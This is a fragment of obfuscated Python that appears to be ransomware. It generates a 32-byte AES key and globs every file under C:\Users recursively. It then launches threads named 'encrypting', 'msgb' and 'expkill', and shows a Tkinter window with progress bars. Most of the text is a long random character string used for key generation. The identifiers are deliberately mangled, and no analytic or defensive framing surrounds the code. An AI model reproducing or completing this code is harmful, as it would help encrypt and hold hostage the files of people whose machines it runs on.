Kc=tC8$hdk2XqvGr@G&D?=BbXR7GWJK_&w?HV*$N5EZe$F%Z_p2TH_?hZznPXKF#w_-rd!m!c2-grB6V%va6Y@A&P&mkX^VJa7K-AHkaVKAbnwRuq$xgNe^*d8m3xgTSxgUvX5_bF343R4=hTWmgY8e+bP98v53Dw#_v5_6Sty8PVRTmhsGRu@RR8z7U+gr@VxvgG6dSZ*fvta2p3ZuGz_JfR*QVh^bA%#N^?n@swADMXu_f+X&hcpRm+pDu%y-CNMM*_%7P&#&6&mafs&yD_V5gqC7NMEw6caf_?d*B2V&MX4WueAs_#h&@mj&cAt*YwcuEua^^%QFhPM-a98heWbRB-yQ#gSZLbJ983+WADVF4yQckAV2Zj-=ubd^j!fdQ!FA4mgUxGb+b+Up!3_4jL@PUMtxDGh!jbrCPSf9Y7JFpNAMqTupF*5A$kYf=DMANSLKwNs-%WdyZqW4Yz%&3vfE$xeA7LDpx48s7TU8mYRbF9eH98Tb#Qy4TK*6MN+uV6+3F+QSDAj9CWzmmDbFS2=t@d3Ynsj6TjtVpEn^W4$uMT*NC7dnR&$rs$a=C*KnKHz-xcpRje4TtseWZqQ9Kt6F^w7wCh9uy23E?XgT-nzm=+K4qYvZ@A9PWQwSua_#RU$dg*XzFBb9^&HK8zQv++ZcMRgH9uhmfk@z#c4*gJ9AK$M2n4zG%GscM%X6PNQsbVSgzkmLq-4_!Vzn4fK%*!3WaWdz?y5mAA#=xAbJXq*SpH&Wd5?qgM%+q5^sn*5KqxFpJYED2KX5?PeXLtV-6zA_KD8xKu=4c_@Nu*m=KQ2$veWM+WU9t?@f@W7ATufgL*gb2_S&CH2sfLJ=MURBd?EF^Tx&8@jM4v9h_n?N&@q3ckFu%&+qF4QvA6qZHBkatvGL*Zg!sF&@QE-TV6zJ2h*hqwxU@A-Q&zhnkgg*BExxHq#7Dh8+gZteCK&M?YKRh2Ye$vQB6c%3uq6@9zL=+Mn4araUY+FaZ3=QTMPyW!37^nLR@^LGNGEe&=aT?N_HU+gtn#h?t_9LFwd#jF3PzY7FffQCfJZZ^zSwz&YF2XQP?G9CBu5?m4C&xjg8F%f?VmfNf34j^msM4N3SF+rGZNt&*zp$5??xzZA!ceXe2wD5FyVB@Ac_#y-jaPB-Gu?#zm$yU6&xHTxFc=zZEVGy-DF7VGnTb#Kpsqzr$K6urH*BT=9Nke??$6m*HwYc2*mV!9L_^J%SuYLsA8kLf?5ZN8baQ+u5ZD3-4dDEHxeZ-T%HE=z?vx$&9*dTUg!-97PQ*sLmwjkP6^A*+Rb*wLxDud@Hm+Mh&SabMTNWZGPDWWAa$MJmas!H7jW@JFVJeu4D!#N7?b#V%Q=3hdAgWMN63W!6apbWM=DxcLBL=MxR9EDv+K^6_A%xHf_uq9zc_JQ6CXPWHCDLt*J*Cn-VzFZ#8B^FEqwzPu6m^CTWTRH3-PpH!cqdd9KT__N&$RGRRPwkwrfQc98YPQF8WR-nhArfVjh#7y5tJ4jzSkFEmvJfqp%u8BhL&TVATs2DkYUvMcG9ET8Avg#ZrMuUJ4r979a=y5$bG9n@gT^_J$ZG+X9^LEh@_x#H4sHQF-GV73?AF*P!^VDs4ux5eGkCCa2Z=@3E*!B^7Y8%!hYvbPghspjV=vVKK#*BX_*JV7LcLWACh6^@^!Ww5Py$Bv+Z=FyqZ#3b@yRDckNz=*-!T_uMtYcd#uBs#+g#=5d27GMVJt8sERA5d7Z+hZ96kn4xhDG_wkEQ7ShvcqAWRSbgpY&Ebd^DC#7XxMx4^Ajcp*+H3mEA$9vU8-7b!=93amyKv%!jkDh#DejYtgfzt+mNn@-9E!Jp9?sEzVhcHw4e5vg86YsdJpD?58tDRZqMa3KeA#%FmEjH*fV-hq@h%mHsRrbx&n%K5Z-aM?Y8@v5jx-ZyyXA=wjbHac!-d4q^HTe*$qhTf*Cd7%&4^5q-=@UtLFNP@#YxFYeZ-khJG-Q8gus#A99dZq4A3QBTxDFxYW5gW-@gdEF^WZUQ^Z*QUAcxKjR#57$K8an3ugh6AuJPP9H5!QYqy!Eck68RQg4?X#vfpCkAQd&yMp9bqY!takQ^7?dgn==cz8TvqXbV=bK3WY396K389Z#G#jUE?Ed%9dMHXNf7uaZsXejxULxZQxvNme&5mTrT=Sy3vC4-VJ=_DXRyZ5Z&hMWyw+NKY?Gf8EG8YMmn54gfkWZATfJm&3ABjTgyT_z%^Q4Z#4N@mPG!drCXRLmX$RMWscA6KadnuVe@GRMQcWr6jFWfCbfzStbQNXSGy5@euNTwJ4$hA5%Ccjv*eDBLv@^-vk+$gx#PjY6tXQXf2W%C+$jwqrqwjjzffte%L7s8sXajZqX6nMg6KtPF^uKGVKQYY?KyZr^p7S+%c6-aXbCmaPnqSpLTDQN*NKQ-J&T&ERqyyVM_?f!uWMqz&dnZJ3e5VFvKeJKW*B*qC#FpDCfXmbexUSLpSAEE7ZJyawW*ERUY&MLZZM$ZknTfP+4q84cg-fcXfSFTsa=PR2urbE&yQxmW7&E_eD-g%bDM+t3%MubRMTkhc%9C9!*pZFXbYDHB%ndCuM#6Ma=aC+TjA@Az-Y=*+dMkDyauK#P!4c47GzX9Dxha6v?Enm@=nwQ$7VNNVs8+BH*XahXz"):#line:108
        return ''.join (random .choice (OOO0O0OO00OOOO0OO )for _O000O0000O0OO0O00 in range (OO0O0O00OOOO00OO0 ))#line:109
    AESkey =bytes (key_generator (32 ).encode ())#line:110
    sps ="C:\\Users\\**"#line:387
    Dirlist =glob .glob (sps ,recursive =True )#line:388
    Dirlist2 =len (Dirlist )#line:389
    rscpy ()#line:390
    crtkey ()#line:391
    cbatfb ()#line:392
    key=rndk (1,AESkey)#line:393s
    d5 =threading .Thread (target =encrypting ).start ()#line:394
    d6 =threading .Thread (target =msgb ).start ()#line:395
    d9 =threading .Thread (target =on_closing ).start ()#line:396
    d10 =threading .Thread (target =expkill ).start ()#line:397
    p_var2 =DoubleVar ()#line:398
    p_var3 =DoubleVar ()#line:399
    progressbar2 =ttk .Progressbar (nmys ,orient =HORIZONTAL ,length =685 ,mode ='determinate')#line:400
    progressbar2 .pack ()#line:401
    progressbar3 =ttk .Progressbar (nmys ,orient =HORIZONTAL ,length =685 ,mode ='determinate')#line:402
    progressbar3 .pack ()#line:403
nmys .mainloop ()#line:404
